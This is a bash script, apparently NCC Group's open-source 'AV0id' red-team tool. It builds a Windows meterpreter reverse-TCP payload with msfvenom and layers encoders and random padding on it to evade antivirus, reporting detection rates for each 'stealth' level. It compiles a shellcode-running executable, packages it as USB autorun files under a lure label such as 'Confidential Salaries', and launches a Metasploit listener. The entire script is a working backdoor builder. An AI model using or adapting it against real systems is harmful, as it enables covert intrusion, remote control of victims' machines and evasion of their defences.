#!/usr/bin/env bash
# AV0id - Metapsloit Payload Anti-Virus Evasion
# Daniel Compton
# www.commonexploits.com
# info@commexploits.com
# Twitter = @commonexploits
# 05/2013
# Tested on Bactrack 5 and Kali only

####################################################################################
# Updated 08/2015
# Removed Deprecated Commands in favor of MsfVenom
# Jason Soto
# www.jsitech.com
# Twitter = @JsiTech
# Tested on Kali Linux

#####################################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/

# Developed by Daniel Compton, daniel dot compton at nccgroup dot com

# https://github.com/nccgroup/metasploitavevasion

#Released under AGPL see LICENSE for more information

######################################################################################

# Credit to other A.V. scripts and research by Astr0baby, Vanish3r & Hasan aka inf0g33k

# User options
PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
MSFVENOM=`which msfvenom` # Path to the msfvenom script
MSFCONSOLE=`which msfconsole` # Path to the msfconsole script

# Script begins
#===============================================================================

VERSION="2.0"

# spinner for Metasploit Generator
spinlong ()
{
    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}


# spinner for random seed generator
spinlong2 ()
{
    bar=" 011001110010010011101110011010101010101101010010101110"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}

clear

echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
echo -e "*** \e[01;31mAV\e[00m\e[01;32m0id\e[00m - Metasploit Shell A.V. Avoider Version $VERSION  ***"
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
sleep 3
clear

# Set Output filename

echo ""
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Type the Desired Output FileName"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read OUTPUTNAME
echo ""
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Type the Desired Label for the AutoRun Files"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo "Example : Confidential Salaries"
echo ""
echo -ne "\e[01;32m>\e[00m "
read LABEL
echo ""

#Check for gcc compiler

which i586-mingw32msvc-gcc >/dev/null 2>&1

if [ $? -eq 0 ]; then
    echo ""
    COMPILER="i586-mingw32msvc-gcc"
else
    which i686-w64-mingw32-gcc
    if [ $? -eq 0 ]; then
        echo ""
        COMPILER="i686-w64-mingw32-gcc"
    else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc or i686-w64-mingw32-gcc (Arch) and try again"
    echo ""
    exit 1
    fi
fi

#Check for Metasploit
if [[ "$MSFVENOM" != "" || "$MSFCONSOLE" != "" ]]; then
    echo ""
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required Metasploit program, cant continue. Install and try again"
    echo -e "\e[01;31m[!]\e[00m If msfpayload, msfencode and msfcli are not in your PATH, edit this script options"
    echo ""
    exit 1
fi


# Random Msfencode encoding iterations
#ITER=`seq 5 10 |sort -R |sort -R | head -1`
ITER=`shuf -i 10-20 -n 1`

echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m What system do you want the Metasploit listener to run on? Enter 1 or 2 and press enter"
echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use my current system and IP address"
echo ""
echo " 2. Use an alternative system, i.e public external address"
echo ""
echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo ""
    IP=$(ip route get 1 | awk '{print $NF;exit}')
    echo -e "\e[01;32m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m using interface \e[01;32m$IPINT\e[00m"
    echo ""
    echo -e "\e[1;31m-------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?"
    echo -e "\e[1;31m-------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read PORT
    echo ""
elif [ "$INTEXT" = "2" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Alternative system selected"
    echo ""
    echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What IP address to you want the listener to run on?"
    echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read IP
    echo ""
    echo ""
    echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on? If on the internet try port 53 if restricted"
    echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read PORT
    echo ""
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again"
    echo ""
    exit 1
fi
echo ""
echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload, please wait..."
echo ""
spinlong
#Payload creater
$MSFVENOM -p "$PAYLOAD" LHOST="$IP" LPORT="$PORT" EXITFUNC=thread -f raw | $MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2>/dev/null | $MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 --platform linux -f raw 2>/dev/null | $MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 --platform win -f raw 2>/dev/null |  $MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 --platform win -f c > msf.c 2>/dev/null
echo ""
echo ""
# Menu
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m How stealthy do you want the file? Enter 1, 2, 3, 4 or 5 and press enter"
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Normal - about 400K payoad  - fast compile - 22/55 A.V. products detected as malicious"
echo ""
echo " 2. Stealth - about 1-2 MB payload - fast compile - 21/55 A.V. products detected as malicious"
echo ""
echo " 3. Super Stealth - about 10-20MB payload - fast compile - 20/55 A.V. detected as malicious"
echo ""
echo " 4. Insane Stealth - about 50MB payload - slower compile - 19/55 A.V. detected as malicious"
echo ""
echo " 5. Desperate Stealth - about 100MB payload - slower compile - Not tested with A.V."
echo ""
echo -e "\e[1;31m----------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read LEVEL
echo ""
if [ "$LEVEL" = "1" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Normal selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 100000-500000 -n 1)
elif [ "$LEVEL" = "2" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Stealth selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 1000000-5000000 -n 1)
elif [ "$LEVEL" = "3" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Super Stealth selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 8000000-12000000 -n 1)
elif [ "$LEVEL" = "4" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Insane Stealth selected, please wait a few minutes"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 40000000-60000000 -n 1)
elif [ "$LEVEL" = "5" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 100000000-200000000 -n 1)
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting"
    echo ""
    exit 1
fi

# build the c file ready for compile
echo ""
echo '#include <stdio.h>' >> build.c
echo 'unsigned char padding[]=' >> build.c
cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c$SEED > random
sed -i 's/$/"/' random
sed -i 's/^/"/' random
cat random >> build.c
echo  ';' >> build.c
echo 'char payload[] =' >> build.c
cat msf.c |grep -v "unsigned" >> build.c
echo 'char comment[512] = "";' >> build.c
echo 'int main(int argc, char **argv) {' >> build.c
echo  '	(*(void (*)()) payload)();' >> build.c
echo '	return(0);' >> build.c
echo '}' >> build.c

# gcc compile the exploit

ls icons/icon.res >/dev/null 2>&1
if [ $? -eq 0 ]; then
    $COMPILER -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME"
else
    $COMPILER -Wall -mwindows build.c -o "$OUTPUTNAME"
fi

# check if file built correctly
LOCATED=`pwd`
ls "$OUTPUTNAME" >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo ""
    echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
    echo ""
    exit 1
fi

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label="$LABEL"" >> autorun/autorun.inf
echo ""
echo -e "\e[01;32m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/"autorun/"\e[00m - simply copy these files to a CD or USB"

# clean up temp files
rm build.c >/dev/null 2>&1
rm random >/dev/null 2>&1
rm msf.c >/dev/null 2>&1


echo ""
sleep 2
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Do you want the listener to be loaded automatically? Enter 1 or 2 and press enter"
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Yes"
echo ""
echo " 2. No"
echo ""
echo -e "\e[1;31m----------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
    echo ""
    $MSFCONSOLE -x "use exploit/multi/handler; set payload $PAYLOAD; set LHOST $IP; set LPORT $PORT; run;"
else
    echo ""
    echo -e "\e[01;32m[-]\e[00m Use msfhandler.rc as msfconsole resource on your listener system:"
    echo ""
    echo 'use exploit/multi/handler' >> msfhandler.rc
    echo "set payload $PAYLOAD" >> msfhandler.rc
    echo "set LHOST $IP" >> msfhandler.rc
    echo "set LPORT $PORT" >> msfhandler.rc
    echo 'exploit' >> msfhandler.rc
    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
    echo "$MSFCONSOLE -r msfhandler.rc"
    echo ""
    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
fi
